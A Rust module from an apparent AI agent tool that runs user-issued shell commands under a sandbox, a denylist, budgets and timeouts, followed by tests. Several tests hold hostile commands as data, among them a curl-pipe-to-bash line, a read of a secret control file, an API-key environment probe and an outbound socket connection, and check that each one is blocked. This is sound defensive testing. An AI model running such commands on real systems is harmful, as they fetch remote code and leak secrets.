//! Canonical execution path for an explicit user-origin `!command` action.
//!
//! Direct shell input is already one-use user consent, but it is not ambient
//! host authority. This module keeps the streamlined frontend syntax while
//! applying the same hard command policy, run capability, sandbox, budget,
//! supervisor, freshness, cancellation, and grounding boundaries as Bash.

use super::{bash_bin, dangerous_shell_construct, path_lint, sandbox, validate_command};
use crate::runtime::{BudgetAmounts, BudgetReservation};
use crate::tools::command::{CommandError, ProcessSnapshot, SupervisedProcessOutput};
use crate::tools::effect::ToolEffect;
use crate::tools::{ToolResource, ToolRunContext};
use std::path::PathBuf;
use std::process::{Command, ExitStatus};
use std::time::Duration;

const DEFAULT_TIMEOUT: Duration = Duration::from_millis(super::DEFAULT_FOREGROUND_TIMEOUT_MS);
const MAX_TIMEOUT: Duration = Duration::from_millis(super::MAX_FOREGROUND_TIMEOUT_MS);
const TRUNCATED_MARKER: &str = "\n... [output truncated] ...\n";

/// A single user-authorized direct-shell action bound to one reality ledger.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DirectShellAction {
    command: String,
    session_key: String,
    timeout: Duration,
}

impl DirectShellAction {
    #[must_use]
    pub fn new(command: impl Into<String>, session_key: impl Into<String>) -> Self {
        Self {
            command: command.into(),
            session_key: session_key.into(),
            timeout: DEFAULT_TIMEOUT,
        }
    }

    /// Override the foreground deadline for an embedding or deterministic test.
    #[must_use]
    pub const fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    #[must_use]
    pub fn command(&self) -> &str {
        &self.command
    }
}

/// Bounded terminal result from a command that reached the shared supervisor.
#[derive(Debug)]
pub struct DirectShellExecution {
    pub cwd: PathBuf,
    pub command: String,
    pub status: Option<ExitStatus>,
    pub stdout: String,
    pub stderr: String,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
}

impl DirectShellExecution {
    #[must_use]
    pub fn exit_code(&self) -> Option<i32> {
        self.status.as_ref().and_then(ExitStatus::code)
    }
}

/// Typed failure that distinguishes pre-spawn rejection from a partial external effect.
#[derive(Debug)]
pub enum DirectShellError {
    Rejected(String),
    Partial {
        message: String,
        execution: Box<DirectShellExecution>,
    },
}

impl DirectShellError {
    #[must_use]
    pub const fn partial_execution(&self) -> Option<&DirectShellExecution> {
        match self {
            Self::Rejected(_) => None,
            Self::Partial { execution, .. } => Some(execution),
        }
    }
}

impl std::fmt::Display for DirectShellError {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Rejected(message) | Self::Partial { message, .. } => formatter.write_str(message),
        }
    }
}

impl std::error::Error for DirectShellError {}

struct PreparedDirectShell {
    action: DirectShellAction,
    cwd: PathBuf,
    command: Option<Command>,
    freshness: Option<crate::evidence_freshness::MutationReservation>,
    budget: BudgetReservation,
}

fn prepare(
    run: &ToolRunContext,
    action: DirectShellAction,
) -> Result<PreparedDirectShell, DirectShellError> {
    run.require(ToolResource::Process)
        .map_err(|error| DirectShellError::Rejected(error.to_string()))?;
    run.admit_runtime_mode_direct_operation("user direct shell")
        .map_err(DirectShellError::Rejected)?;
    if action.command.trim().is_empty() {
        return Err(DirectShellError::Rejected(
            "Direct shell command cannot be empty".to_string(),
        ));
    }
    if action.timeout.is_zero() || action.timeout > MAX_TIMEOUT {
        return Err(DirectShellError::Rejected(format!(
            "Direct shell timeout must be between 1ms and {}ms",
            MAX_TIMEOUT.as_millis()
        )));
    }
    validate_command(&action.command).map_err(DirectShellError::Rejected)?;

    let outside_root_tokens = path_lint::outside_run_root_count(run, &action.command);
    if outside_root_tokens > 0 {
        tracing::warn!(
            target: "openclaudia::direct_shell",
            event = "non_authoritative_path_lint",
            run_id = %run.run_id(),
            outside_root_tokens,
            "Direct shell text names paths outside declared roots; sandbox containment remains authoritative"
        );
    }
    if let Some(reason) = dangerous_shell_construct(&action.command) {
        tracing::debug!(
            target: "openclaudia::direct_shell",
            event = "shell_structural_lint",
            run_id = %run.run_id(),
            reason,
            "Direct shell structural lint recorded; hard policy and sandbox remain authoritative"
        );
    }

    let budget = run
        .budget()
        .reserve(BudgetAmounts {
            concurrent_calls: 1,
            ..BudgetAmounts::default()
        })
        .map_err(|error| {
            DirectShellError::Rejected(format!("Run budget denied direct shell: {error}"))
        })?;
    let freshness = crate::evidence_freshness::reserve_mutation(run, ToolEffect::Destructive)
        .map_err(|error| {
            DirectShellError::Rejected(format!(
                "Cannot reserve direct-shell mutation freshness: {error}"
            ))
        })?;
    let cwd = run.working_directory().to_path_buf();

    #[cfg(windows)]
    let shell = super::find_git_bash(run)
        .map_or_else(|| bash_bin(run), Ok)
        .map_err(DirectShellError::Rejected)?;
    #[cfg(not(windows))]
    let shell = bash_bin(run).map_err(DirectShellError::Rejected)?;

    let command = sandbox::sandboxed_bash_command(run, &shell, &action.command, &cwd)
        .map_err(DirectShellError::Rejected)?;
    tracing::info!(
        target: "openclaudia::direct_shell",
        event = "direct_shell_admitted",
        run_id = %run.run_id(),
        generation = %run.generation(),
        timeout_ms = action.timeout.as_millis(),
        "Admitted one user-origin direct shell action"
    );
    Ok(PreparedDirectShell {
        action,
        cwd,
        command: Some(command),
        freshness,
        budget,
    })
}

fn rendered_stream(bytes: &[u8], truncated: bool) -> String {
    let mut rendered = String::from_utf8_lossy(bytes).into_owned();
    if truncated {
        rendered.push_str(TRUNCATED_MARKER);
    }
    rendered
}

fn execution_from_output(
    prepared: &PreparedDirectShell,
    output: &SupervisedProcessOutput,
) -> DirectShellExecution {
    DirectShellExecution {
        cwd: prepared.cwd.clone(),
        command: prepared.action.command.clone(),
        status: Some(output.status),
        stdout: rendered_stream(&output.stdout.bytes, output.stdout.truncated),
        stderr: rendered_stream(&output.stderr.bytes, output.stderr.truncated),
        stdout_truncated: output.stdout.truncated,
        stderr_truncated: output.stderr.truncated,
    }
}

fn execution_from_snapshot(
    prepared: &PreparedDirectShell,
    snapshot: &ProcessSnapshot,
) -> DirectShellExecution {
    DirectShellExecution {
        cwd: prepared.cwd.clone(),
        command: prepared.action.command.clone(),
        status: snapshot.status,
        stdout: rendered_stream(&snapshot.stdout.bytes, snapshot.stdout.truncated),
        stderr: rendered_stream(&snapshot.stderr.bytes, snapshot.stderr.truncated),
        stdout_truncated: snapshot.stdout.truncated,
        stderr_truncated: snapshot.stderr.truncated,
    }
}

fn settle_started(
    run: &ToolRunContext,
    prepared: &mut PreparedDirectShell,
    execution: &DirectShellExecution,
) -> Result<(), String> {
    let mut errors = Vec::new();
    if let Some(freshness) = prepared.freshness.as_mut() {
        if let Err(error) = freshness.commit() {
            errors.push(format!("freshness accounting failed: {error}"));
        }
    }
    crate::ledger::invalidate_verification_receipts_for_run(run);
    let binding = crate::ledger::RunBinding::from_run(run);
    super::record_command_observation_for_session(
        &binding,
        &prepared.action.session_key,
        &execution.cwd,
        &execution.command,
        execution.exit_code().unwrap_or(-1),
        &execution.stdout,
        &execution.stderr,
    );
    if errors.is_empty() {
        Ok(())
    } else {
        Err(errors.join("; "))
    }
}

fn finish(
    run: &ToolRunContext,
    mut prepared: PreparedDirectShell,
    outcome: Result<SupervisedProcessOutput, CommandError>,
) -> Result<DirectShellExecution, DirectShellError> {
    let (mut result, started) = match outcome {
        Ok(output) => (Ok(execution_from_output(&prepared, &output)), true),
        Err(error) => error.partial().map_or_else(
            || (Err(DirectShellError::Rejected(error.to_string())), false),
            |snapshot| {
                let execution = execution_from_snapshot(&prepared, snapshot);
                (
                    Err(DirectShellError::Partial {
                        message: format!("Direct shell failed after starting: {error}"),
                        execution: Box::new(execution),
                    }),
                    true,
                )
            },
        ),
    };

    if started {
        let execution = match &result {
            Ok(execution) => execution,
            Err(DirectShellError::Partial { execution, .. }) => execution,
            Err(DirectShellError::Rejected(_)) => unreachable!("started outcome must be partial"),
        };
        if let Err(error) = settle_started(run, &mut prepared, execution) {
            result = match result {
                Ok(execution) => Err(DirectShellError::Partial {
                    message: format!("Direct shell completed but {error}"),
                    execution: Box::new(execution),
                }),
                Err(DirectShellError::Partial { message, execution }) => {
                    Err(DirectShellError::Partial {
                        message: format!("{message}; {error}"),
                        execution,
                    })
                }
                Err(DirectShellError::Rejected(_)) => {
                    unreachable!("started outcome must be partial")
                }
            };
        }
    }

    if let Err(error) = prepared.budget.commit() {
        result = match result {
            Ok(execution) => Err(DirectShellError::Partial {
                message: format!("Direct shell completed but budget accounting failed: {error}"),
                execution: Box::new(execution),
            }),
            Err(DirectShellError::Partial { message, execution }) => {
                Err(DirectShellError::Partial {
                    message: format!("{message}; budget accounting failed: {error}"),
                    execution,
                })
            }
            Err(DirectShellError::Rejected(message)) => Err(DirectShellError::Rejected(format!(
                "{message}; budget accounting failed: {error}"
            ))),
        };
    }
    tracing::info!(
        target: "openclaudia::direct_shell",
        event = "direct_shell_finished",
        run_id = %run.run_id(),
        started,
        success = result.is_ok(),
        "Settled one user-origin direct shell action"
    );
    result
}

/// Execute one user-origin shell action through the shared synchronous supervisor.
///
/// # Errors
///
/// Returns [`DirectShellError::Rejected`] when admission or spawning fails
/// before an external effect, and [`DirectShellError::Partial`] when a started
/// process is interrupted or its post-effect accounting cannot be completed.
pub fn execute_direct_shell(
    run: &ToolRunContext,
    action: DirectShellAction,
) -> Result<DirectShellExecution, DirectShellError> {
    let mut prepared = prepare(run, action)?;
    let timeout = prepared.action.timeout;
    let Some(command) = prepared.command.take() else {
        return Err(DirectShellError::Rejected(
            "Prepared direct shell lost its process command".to_string(),
        ));
    };
    let outcome = crate::tools::command::run_prepared_run_owned_sync(
        run,
        command,
        "direct shell",
        crate::tools::command::ProcessLimits::new(timeout),
    );
    finish(run, prepared, outcome)
}

/// Execute one user-origin shell action through the shared asynchronous supervisor.
///
/// # Errors
///
/// Returns [`DirectShellError::Rejected`] when admission or spawning fails
/// before an external effect, and [`DirectShellError::Partial`] when a started
/// process is interrupted or its post-effect accounting cannot be completed.
pub async fn execute_direct_shell_async(
    run: &ToolRunContext,
    action: DirectShellAction,
) -> Result<DirectShellExecution, DirectShellError> {
    let mut prepared = prepare(run, action)?;
    let timeout = prepared.action.timeout;
    let Some(command) = prepared.command.take() else {
        return Err(DirectShellError::Rejected(
            "Prepared direct shell lost its process command".to_string(),
        ));
    };
    let outcome = crate::tools::command::run_prepared_run_owned(
        run,
        command,
        "direct shell",
        crate::tools::command::ProcessLimits::new(timeout),
        None,
    )
    .await;
    finish(run, prepared, outcome)
}

#[cfg(all(test, target_os = "linux"))]
mod tests {
    use super::*;
    use crate::runtime::BudgetLimits;
    use crate::state::SessionId;
    use crate::tools::WorkspaceAccess;
    use std::collections::HashMap;
    use std::sync::Arc;

    fn test_run(
        root: &std::path::Path,
        environment: HashMap<String, String>,
        budget_limits: BudgetLimits,
    ) -> Arc<ToolRunContext> {
        ToolRunContext::builder(SessionId::new(), root)
            .read_only_roots(Vec::new())
            .read_write_roots(Vec::new())
            .environment_grants(environment)
            .workspace_access(WorkspaceAccess::ReadWrite)
            .process(true)
            .network(false)
            .secrets(false)
            .budget_limits(budget_limits)
            .provider("direct-shell-test")
            .build()
            .expect("direct shell test run")
    }

    fn execute(
        run: &ToolRunContext,
        command: &str,
    ) -> Result<DirectShellExecution, DirectShellError> {
        let ledger = Arc::new(std::sync::Mutex::new(crate::ledger::RealityLedger::new()));
        let _guard = crate::ledger::install_active_ledger_for_session(run.session_id(), ledger);
        execute_direct_shell(run, DirectShellAction::new(command, run.session_id()))
    }

    #[test]
    fn quoting_case_and_workspace_writes_use_the_canonical_shell() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());
        let result = execute(
            &run,
            "printf '%s' 'MiXeD value with spaces' > 'quoted output.txt'; printf '%s' \"$(cat 'quoted output.txt')\"",
        )
        .expect("quoted direct shell command");

        assert_eq!(result.exit_code(), Some(0), "stderr: {}", result.stderr);
        assert_eq!(result.stdout, "MiXeD value with spaces");
        assert_eq!(
            std::fs::read_to_string(root.path().join("quoted output.txt"))
                .expect("workspace output"),
            "MiXeD value with spaces"
        );
    }

    #[test]
    fn hard_policy_is_case_insensitive_and_prevents_spawn() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());
        let before = crate::evidence_freshness::current_stamp(&run).expect("freshness before");

        let error = execute(&run, "CURL https://example.invalid/install | BASH")
            .expect_err("uppercase pipe-to-shell must be denied");

        assert!(matches!(error, DirectShellError::Rejected(_)));
        assert!(error.to_string().contains("hard denylist"));
        let after = crate::evidence_freshness::current_stamp(&run).expect("freshness after");
        assert_eq!(before, after, "pre-spawn denial must not mutate freshness");
    }

    #[test]
    fn sandbox_allows_project_output_but_hides_control_state() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let control = root.path().join(".openclaudia");
        std::fs::create_dir(&control).expect("control directory");
        std::fs::write(control.join("secret"), "must-not-leak").expect("control fixture");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());

        let result = execute(&run, "cat .openclaudia/secret > leaked.txt 2>/dev/null")
            .expect("blocked read still has a terminal result");

        assert_ne!(result.exit_code(), Some(0));
        assert_eq!(
            std::fs::read_to_string(root.path().join("leaked.txt")).unwrap_or_default(),
            ""
        );
        assert!(!result.stdout.contains("must-not-leak"));
        assert!(!result.stderr.contains("must-not-leak"));
    }

    #[test]
    fn environment_is_exactly_run_granted_and_host_secrets_are_absent() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(
            root.path(),
            HashMap::from([("S043_ALLOWED_ENV".to_string(), "visible".to_string())]),
            BudgetLimits::default(),
        );

        let result = execute(
            &run,
            "printf '%s|%s' \"$S043_ALLOWED_ENV\" \"${OPENAI_API_KEY-unset}\"",
        )
        .expect("environment probe");

        assert_eq!(result.exit_code(), Some(0), "stderr: {}", result.stderr);
        assert_eq!(result.stdout, "visible|unset");
    }

    #[test]
    fn sandbox_cannot_connect_to_a_host_listener() {
        let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("host listener");
        let port = listener.local_addr().expect("listener address").port();
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());
        let command = format!(
            "python3 -c 'import socket; socket.create_connection((\"127.0.0.1\", {port}), .2)'"
        );

        let result = execute(&run, &command).expect("network probe terminal result");

        assert_ne!(result.exit_code(), Some(0));
        listener
            .set_nonblocking(true)
            .expect("nonblocking listener");
        assert!(matches!(
            listener.accept(),
            Err(ref error) if error.kind() == std::io::ErrorKind::WouldBlock
        ));
    }

    fn assert_started_with_ready_marker(error: &DirectShellError) {
        assert_eq!(
            error
                .partial_execution()
                .expect("started command must retain partial execution")
                .stdout,
            "ready\n"
        );
    }

    #[test]
    fn deadline_kills_and_reaps_the_sandbox_process_tree() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());
        let action = DirectShellAction::new(
            "(sleep 1; printf survived > deadline-survivor) & printf 'ready\\n'; sleep 60",
            run.session_id(),
        )
        .with_timeout(Duration::from_millis(150));
        let ledger = Arc::new(std::sync::Mutex::new(crate::ledger::RealityLedger::new()));
        let _guard = crate::ledger::install_active_ledger_for_session(run.session_id(), ledger);

        let error = execute_direct_shell(&run, action).expect_err("command must time out");
        assert_started_with_ready_marker(&error);
        assert!(error.to_string().contains("timed out"));
        std::thread::sleep(Duration::from_millis(1_100));
        assert!(
            !root.path().join("deadline-survivor").exists(),
            "a sandbox descendant survived the supervisor deadline"
        );
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn run_cancellation_kills_and_reaps_the_sandbox_process_tree() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());
        let action = DirectShellAction::new(
            "(sleep 1; printf survived > cancellation-survivor) & printf 'ready\\n'; sleep 60",
            run.session_id(),
        );
        let run_for_task = Arc::clone(&run);
        let ledger = Arc::new(std::sync::Mutex::new(crate::ledger::RealityLedger::new()));
        let _guard = crate::ledger::install_active_ledger_for_session(run.session_id(), ledger);
        let task =
            tokio::spawn(async move { execute_direct_shell_async(&run_for_task, action).await });
        tokio::time::sleep(Duration::from_millis(150)).await;
        let _receipt = run
            .runtime()
            .cancellation()
            .cancel(crate::runtime::CancellationReason::User);

        let error = task
            .await
            .expect("direct shell task")
            .expect_err("command must be cancelled");
        assert_started_with_ready_marker(&error);
        assert!(error.to_string().contains("cancelled"));
        tokio::time::sleep(Duration::from_millis(1_100)).await;
        assert!(
            !root.path().join("cancellation-survivor").exists(),
            "a sandbox descendant survived run cancellation"
        );
    }

    #[test]
    fn nonzero_terminal_status_is_a_completed_execution() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());

        let result = execute(&run, "printf terminal; printf diagnostic >&2; exit 7")
            .expect("nonzero status is still a supervised terminal result");

        assert_eq!(result.exit_code(), Some(7));
        assert_eq!(result.stdout, "terminal");
        assert_eq!(result.stderr, "diagnostic");
    }

    #[test]
    fn captured_output_is_bounded_and_reports_truncation() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(root.path(), HashMap::new(), BudgetLimits::default());

        let result = execute(&run, "yes x | head -c 11000000").expect("large output command");

        assert_eq!(result.exit_code(), Some(0), "stderr: {}", result.stderr);
        assert!(result.stdout_truncated);
        assert!(result.stdout.ends_with(TRUNCATED_MARKER));
        assert!(result.stdout.len() < 10_500_000);
    }

    #[test]
    fn process_budget_denial_occurs_before_spawn() {
        let root = tempfile::tempdir_in(".").expect("direct shell root");
        let run = test_run(
            root.path(),
            HashMap::new(),
            BudgetLimits {
                concurrent_calls: 0,
                ..BudgetLimits::default()
            },
        );

        let error = execute(&run, "printf should-not-run")
            .expect_err("zero process concurrency must deny direct shell");

        assert!(matches!(error, DirectShellError::Rejected(_)));
        assert!(error.to_string().contains("concurrent_calls"));
    }
}
